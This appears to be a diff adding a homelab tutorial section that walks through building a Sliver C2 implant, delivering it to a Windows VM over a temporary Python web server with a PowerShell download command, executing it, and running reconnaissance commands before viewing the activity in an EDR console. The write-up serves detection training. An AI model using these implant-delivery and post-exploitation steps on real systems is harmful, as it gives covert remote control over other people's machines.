@@ -1,0 +1,45 @@
+This section will document my steps to both make and observe noise in this homelab.
+If you are following along, these parts are in chronological order so try not to skip around.
+
+Generating the C2 payload:
+
+1. Hop into an SSH session on the linux VM (just like part 1) for the next few actions:
+  a. get into a root shell and change directory to the sliver install
+      - 'sudo su' and 'cd /opt/sliver' respectively 
+  b. Launch the sliver server with 'sliver-server'
+  c. generate the first C2 session payload, use the static IP address from the Linux VM in part 1 'generate --http [Linux_VM_IP] --save /opt/sliver'
+  d. use 'implants' to confirm the new implant was successfully generated
+  e. We have our payload so we can exit sliver for now 
+
+2. We can easily download the C2 payload form the linux to windows VM if we spin up a temp web server with pyhton 
+  a. 'cd /opt/sliver'
+  b. 'python3 -m http.server 80'
+
+3. Go over to the Windows VM and launch an admin powershell console, then run the following command: 'IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe'
+
+Start Command and Control Session:
+
+1. Since the payload is on the Windows VM, we need to go back to the Linux SSH session and enable the sliver http server to catch the callback
+  a. first kill the web server with  ctrl+c
+  b. relaunch sliver and start the http listener
+      - 'sliver-server' and 'http'
+  c. Go back to the windows VM and excecute the payload with the previous admin powershell prompt and use this command: 'C:\Users\User\Downloads\<your_C2-implant>.exe"
+  d. you should be seeing the session check in on the sliver server, you can verify the session in sliver with 'sessions'. Keep track of the session ID since we need that later
+
+2. To interact with the C2 session you can type this command: 'use [session_ID]'
+
+3. You are now in direct contact with the C2 session. I ran a few commands to see what we are working with on the victim host
+  a. Basic info 'info'
+  b. what user the implant is runnign as and it's privileges: 'whoami' and 'getprivs'
+  c. Since this attack was ran with admin perms, there are a few privileges that make our job a lot easier, especially 'SeDebugPrivilege'
+  d. get the implants working directory: 'pwd'
+  e. take a look at the network connections on the remote system: 'netstat' 
+      - sliver highlihgts its own processes in green
+  f. take a look at the running processes on the remote system: 'ps -T'
+      - sliver highlights itself in green and defensive tools in red
+
+Observe EDR Telemetry:
+
+1. I went back into the LimaCharlie website and check out some of the basic features and get a basic understanding of some of the processes going on. I found that usually a signed process is going to be benign (though not always). I saw that the easiest way to spot anything unusual was to look for the unsigned processes, the C2 implant from earlier was unsigned and also shows that it is active on my network.
+
+2. I also browsed to the location where I know my implant is running from, this let me inspect the hash and see if I saw anything on VirusTotal. I didn't find anything with makes sense since we just made the payload ourselves so there is no way VirusTotal would know. 
